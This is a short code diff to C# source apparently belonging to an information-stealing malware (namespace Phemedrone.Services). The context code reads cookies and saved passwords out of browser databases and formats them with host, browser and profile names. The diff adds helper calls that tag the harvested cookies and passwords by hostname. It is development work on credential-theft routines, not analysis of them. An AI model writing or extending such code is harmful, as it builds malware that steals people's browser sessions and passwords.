@@ -66,6 +66,7 @@ namespace Phemedrone.Services
                                 var expires = (ulong)row(6);
                                 var name = Encoding.UTF8.GetString((byte[])row(2));
                                 var value = Encoding.UTF8.GetString((byte[])row(3));
+                                BrowserHelpers.CookiesTags(hostname);
                                 return BrowserHelpers.FormatCookie(hostname, httpOnly, path, secure, (long)expires, name, value);
                             });
                         
@@ -145,7 +146,7 @@ namespace Phemedrone.Services
 
                 var credentials =
                     list.ToArray();
-                
+                BrowserHelpers.PasswordsTags(hostName);
                 array.Add(BrowserHelpers.FormatPassword(hostName, credentials[0], credentials[1],
                     browserName, "1", profileName));
             }
